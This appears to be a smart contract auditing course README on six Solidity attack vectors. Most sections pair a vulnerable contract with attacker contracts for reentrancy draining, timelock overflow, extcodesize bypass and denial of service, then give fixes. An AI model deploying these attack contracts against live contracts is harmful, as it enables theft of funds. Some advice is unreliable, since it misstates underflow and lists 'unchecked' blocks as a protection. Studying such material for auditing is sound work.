# GUILD-AUDIT-Smart-contract-Audting-Training-week3-4-5-6

These are smart contract attack vectors and vulnerability with code examples.

## SOLIDITY ATTACK VECTORS #1 - REENTRANCY ATTACK

A reentrancy attack in solidity repeatedly withdraws funds from a smart contract and transfers them to an unauthorized contract until the funds have been exhausted. The attack occurs when a smart contract function temporarily gives up control flow of the transaction by making an external call to a contract that is sometimes written by unknown or possibly hostile actors.

The following are prominent reentrancy attacks in blockchain protocols: The DAO hack, Lendf.me, Fei Protocol, Paraluni, Grim Finance, SIREN Protocol, and Cream Finance.

There are two types of reentrancy attacks: a single function and cross-function reentrancy attack. 

1. Single Reentrancy Attacks: occurs when the vulnerable function is the same function the attacker is trying to recursively call.

2. Cross-function Reentrancy Attacks: is feasible only when a vulnerable function shares state with another function that has a desirable effect for the attacker.

### How does a reentrancy attack work? 
A reentrancy attack creates a recursive process that transfers funds between two smart contracts, the vulnerable contract and the malicious contract. Here are the steps of a reentrancy attack:

![Reentrancy Attack Illustration](/images/solidity-reentrancy-attack.jpg "Reentrancy Attack Illustration")

1. The bad actor makes a call on the vulnerable contract, "`EtherStore`", to transfer funds to the malicious contract, "`Attack`".
2. Contract `EtherStore` determines whether the attacker has the necessary funds, then proceeds to transfer the funds to contract `Attack`.
3. Once contract `Attack` receives the funds, it executes a callback function which calls back into contract `EtherStore` before the balance is updated.
4. This recursive process continues until all funds have been exhausted and transferred.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

### How to Prevent a Reentrancy Attack
Developing a rigorous blockchain security framework is critical to prevent and mitigate potential damage from a reentrancy attack. The following anti-reentrancy best practices will help developers and the broader web3 community secure their funds: checks, effects and interactions (CEI), reentrancy guards, pull payments, and gas limits.

1. Checks, Effects, and Interactions (CEI)
The CEI process is a rudimentary method to prevent reentrancy. `Checks` refer to the truthfulness of the condition, `effects` refer to state modifications that result from interaction, and `interactions` refer to transactions between functions or contracts. State updates are performed before the value transfer that they record.

2. Potential security risks and loopholes associated with placing executive effects before interactions are an important consideration for developers. 

3. Reentrancy Guard or Mutex
A reentrancy guard or mutex can be created as a function or function modifier. A boolean lock is placed around the function call that is vulnerable to reentrancy. This implies that the initial state of ‘locked’ is false, however, it is set to true immediately before the vulnerable function execution begins and is then quickly set back to false after termination. 

4. Pull Payment
A more secure end-to-end transaction is by using the pull payment methodology. The pull payment process mandates using an intermediary escrow to send funds and avoids direct contact with a potentially hostile contact. By sending funds via an intermediary escrow, the smart contract's funds are protected from a reentrancy attack. The escrow could be subject to reentrancy if it manages funds for multiple accounts. The CEI pattern and reentrancy guard should be implemented where appropriate. 

5. Gas limit
Gas limits are not an optimal method to avert an attacker since gas costs depend on Ethereum’s opcodes, which are subject to change. On the other hand, smart contract code is immutable. Understanding the difference between the send, transfer, and call functions is important. Send and transfer are effectively the same, but the transfer will revert if the transaction fails and send will not. Unlike send and transfer, the call function does not have a gas limit and will forward its gas to execute multi-contract transactions. Unfortunately, this also means that reentrancy attacks are possible. 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract EtherStore {
    mapping(address => uint) public balances;
    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) public noReentrant {
        uint bal = balances[msg.sender];
        require(bal > 0);

        balances[msg.sender] = 0; // the balance is updated before the transfer

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```
In the contract above, the state was updated before the transfer, there is also a reentrancy modifier guard. These two methods can be used to prevent reentrancy.

### CONCLUSION
Re-entrancy attacks are made possible by the use of a logical but insecure code pattern when performing transfers within Ethereum smart contracts. Bad actors exploit the blockchain by implementing reentrancy attacks to transfer and drain funds from vulnerable smart contracts.

## SOLIDITY ATTACK VECTORS #2 - Arithmetic Overflow and Underflow

### Overflow
Overflow is a state a uint (unsigned integer) reaches its maximum value, the next element added will return the default value. **uint8**, can hold values within the range(0, 255), if the value of an arithmetic operation becomes greater than 255, the value is set to zero which is an incorrect calculation.

### Underflow
Overflow is a state a uint (unsigned integer) reaches its minimum value, the next element subtracted will return the maximum byte size. **uint8**, can hold values within the range(0, 255), if the value of an arithmetic operation becomes lesser than 0, the value is set to 255 which is an incorrect calculation.

![Arithmetic Overflow and Underflow Illustration](/images/overflow-underflow.png "Arithmetic Overflow and Underflow Illustration")

In the **TimeLock** contract below, you can deposit funds into the contract, but you can only withdraw the funds after a week has passed. The lock time can also be increased by _increaseLockTime_ function.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

contract TimeLock {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}
```

The funds deposited is stored in the **locktime** array. To exploit this contract, the attacker have to bypass the check for the lockTime period of the user.
``` 
require(block.timestamp > lockTime[msg.sender], "Lock time not expired"); 
```
By doing this:

```solidity
contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        /*
        if t = current lock time then we need to find x such that
        x + t = 2**256 = 0
        so x = -t
        2**256 = type(uint).max + 1
        so x = type(uint).max + 1 - t
        */
        timeLock.increaseLockTime(
            type(uint).max + 1 - timeLock.lockTime(address(this))
        );
        timeLock.withdraw();
    }
}
```

In the _attack_ function, the user deposit ether into the contract and calls the _increaseLockTime_ function to cause `Underflow`.
```
type(uint).max + 1 - timeLock.lockTime(address(this))
```
we are subtracting the current timestamp value in the lockTime array, which after execution results in the value zero. And now, you can now withdraw your funds without any restrictions.

### Preventative Techniques
* Use _SafeMath_ libraries for arithmetic operations to prevent arithmetic overflow and underflow

* There is a new "unchecked" block you can wrap your variables around.
```
unchecked {
    myUint8--;
}
```

* Solidity ≥0.8 defaults to throwing an error for overflow / underflow. It is handled by default.

## SOLIDITY ATTACK VECTORS #3 - Contract With Zero Code Size
In Ethereum, accounts can either be _Externally Owned Account, (EOA)_ or _Contract Account_.  

A developer may decides to allow only _Externally Owned Addresses (EOA)_ to interact with his contract, then the developer can add a check via extcodesize, which returns a value greater than 0, then the log will print “no contract allowed”. We are going to bypass this check.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Target {
    function isContract(address account) public view returns (bool) {
        // This method relies on extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.
        uint size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    bool public pwned = false;

    function protected() external {
        require(!isContract(msg.sender), "no contract allowed");
        pwned = true;
    }
}
```
The contract below contains a function called **pwn**. When executed with the target address, the function fails. The target address will detect that this contract contains code which caused the call to fail.

```solidity
contract FailedAttack {
    // Attempting to call Target.protected will fail,
    // Target block calls from contract
    function pwn(address _target) external {
        // This will fail
        Target(_target).protected();
    }
}
```

We can bypass this check by defining and calling the protected function of the Target contract as part of our malicious contract. The target contract is called in the constructor. The code size(extcodesize) of our contract is currently 0 the contract is under creation and hasn't been deployed.

```solidity
contract Hack {
    bool public isContract;
    address public addr;

    // When contract is being created, code size (extcodesize) is 0.
    // This will bypass the isContract() check
    constructor(address _target) {
        isContract = Target(_target).isContract(address(this));
        addr = address(this);
        // This will work
        Target(_target).protected();
    }
}
```

## SOLIDITY ATTACK VECTORS #4 - Signature Replay
Signature Replay is using the same signature to execute transactions multiple times. The benefit of signature replay is to reduce number of transaction on chain and perform a gas-less transaction, called <u>`meta transaction`</u>.

Take for an example, a multisig wallet controlled by _Bob_ and _Alice_. _Bob_ initiates a transaction for withdrawal, thereby approving himself to spend ether, _Alice_ also approve _Bob_ to withdraw ether, and the withdrawal is finally done making three transactions in total. 
![Signature Replay 1 Illustration](/images/sig1.png "Signature Replay 1 Illustration")
However, using signature can help us reduce the transactions to one, _Alice_ can send her signature to _Bob_ off-chain, then _Bob_ can send his signature together with Alice's signature into the contract.
![Signature Replay 2 Illustration](/images/sig2.png "Signature Replay 2 Illustration")
Using the same signature, _Bob_ can withdraw another ether without _Alice's_ approval.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.5/contracts/utils/cryptography/ECDSA.sol";

contract MultiSigWallet {
    using ECDSA for bytes32;

    address[2] public owners;

    constructor(address[2] memory _owners) payable {
        owners = _owners;
    }

    function deposit() external payable {}

    function transfer(address _to, uint _amount, bytes[2] memory _sigs) external {
        bytes32 txHash = getTxHash(_to, _amount);
        require(_checkSigs(_sigs, txHash), "invalid sig");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    function getTxHash(address _to, uint _amount) public view returns (bytes32) {
        return keccak256(abi.encodePacked(_to, _amount));
    }

    function _checkSigs(
        bytes[2] memory _sigs,
        bytes32 _txHash
    ) private view returns (bool) {
        bytes32 ethSignedHash = _txHash.toEthSignedMessageHash();

        for (uint i = 0; i < _sigs.length; i++) {
            address signer = ethSignedHash.recover(_sigs[i]);
            bool valid = signer == owners[i];

            if (!valid) {
                return false;
            }
        }

        return true;
    }
}
```

### Preventive Techniques
Having a unique signature for every transaction by keeping track of every transaction that has been executed. This can be accomplished by icluding the _nonce_ in the signature and keeping track of the _nonce_ in the contract.

For the same code deployed at a different address, signature replay can be prevented by including the address of the contract in the signature. To prevent attack from the first case, nonce can be included in the contract.


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.5/contracts/utils/cryptography/ECDSA.sol";

contract MultiSigWallet {
    using ECDSA for bytes32;

    address[2] public owners;
    mapping(bytes32 => bool) public executed;

    constructor(address[2] memory _owners) payable {
        owners = _owners;
    }

    function deposit() external payable {}

    function transfer(
        address _to,
        uint _amount,
        uint _nonce,
        bytes[2] memory _sigs
    ) external {
        bytes32 txHash = getTxHash(_to, _amount, _nonce);
        require(!executed[txHash], "tx executed");
        require(_checkSigs(_sigs, txHash), "invalid signature");

        executed[txHash] = true;

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    function getTxHash(
        address _to,
        uint _amount,
        uint _nonce
    ) public view returns (bytes32) {
        return keccak256(abi.encodePacked(address(this), _to, _amount, _nonce));
    }

    function _checkSigs(
        bytes[2] memory _sigs,
        bytes32 _txHash
    ) private view returns (bool) {
        bytes32 ethSignedHash = _txHash.toEthSignedMessageHash();

        for (uint i = 0; i < _sigs.length; i++) {
            address signer = ethSignedHash.recover(_sigs[i]);
            bool valid = signer == owners[i];

            if (!valid) {
                return false;
            }
        }

        return true;
    }
}
```

## SOLIDITY ATTACK VECTORS #5 - Block Timestamp Manipulation Attack
A miner can manipulate the _block.timestamp_ which can be used to their advantage to attack a smart contract. _block.timestamp_ can be manipulated by miners with the following constraints:

* it cannot be stamped with an earlier time than its parent
* it cannot be too far in the future

The Roulette contract is a game where you can win all of the Ether in the contract if you can submit a transaction at a specific timing.
A player needs to send 5 Ether and wins if the _block.timestamp_ % 15 == 0.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Roulette {
    uint public pastBlockTime;

    constructor() payable {}

    function spin() external payable {
        require(msg.value == 5 ether);
        require(block.timestamp != pastBlockTime);

        pastBlockTime = block.timestamp;

        if (block.timestamp % 15 == 0) {
            (bool sent, ) = msg.sender.call{value: address(this).balance}("");
            require(sent, "Failed to send Ether");
        }
    }
}
```
A miner will try to manipulate the system to win the Ether in this contract by calling the spin function and submit 5 Ether to play the game, then submit a _block.timestamp_ for the next block that is divisible by 15. If the miner wins the next block he will win all the Ether in the smart contract. 

### Preventive Techniques
Don't use block.timestamp for a source of entropy and random number. In a case where you have to use _block.timestamp_ follow the <u>`15 second rule`</u>: if the scale of your time-dependent event can vary by 15 seconds and maintain integrity.

## SOLIDITY ATTACK VECTORS #6 - Denial Of Service
Denial of Service by rejecting to accept Ether. There are many ways to attack a smart contract to make it unusable. One exploit is denial of service by making the function to send Ether fail.

The solidity fallback function is executed if none of the other functions match the function identifier or no data was provided with the function call. When a _fallback_ function is not defined, the ether sent to the contract will be rejected, and this will prevent the rest of the logic to be executed. This is the overview of Denial of Service Attack.

Historically, there was a denial of service attack during the “Turbulent Age” of the game KotET(King OG the Ether Throne) from 6 to 8 February 2016, which resulted in some character compensation and unreceived money not being returned to the player’s wallet.

In the contract, KingOfEther, the goal of each player is to become _king_ by sending more ether than the previous player. The previous player will be refunded the amount of ether deposited in the contract. The attacker uses the _Attack_ contract with no _fallback_ function to send ether to _KingOfEther_ contract, then becomes the _king_. Any attempt to make another player after the attacker to become the _king_ will fail and revert the state.


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract KingOfEther {
    address public king;
    uint public balance;

    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

        (bool sent, ) = king.call{value: balance}("");
        require(sent, "Failed to send Ether");

        balance = msg.value;
        king = msg.sender;
    }
}

contract Attack {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}
```

Once the attacker becomes the _king_, subsequequent call to the `claimThrone()` will always fail. The game will no longer be able to continue, as no one can be able to deposit ether and become _king_.
```solidity
require(sent, "Failed to send Ether");
```

### Preventive Technique
It is recommended to use fetch mode instead of send mode, each player can get their money back by using _withdraw()_.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract KingOfEther {
    address public king;
    uint public balance;
    mapping(address => uint) public balances;

    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

        balances[king] += balance;

        balance = msg.value;
        king = msg.sender;
    }

    function withdraw() public {
        require(msg.sender != king, "Current king cannot withdraw");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}
```

The mapping of the balances of each player will be updated in _claimThrone()_, and the player who was dethroned by the new _king_ can now call the _withdraw()_ to withdraw his/her funds.
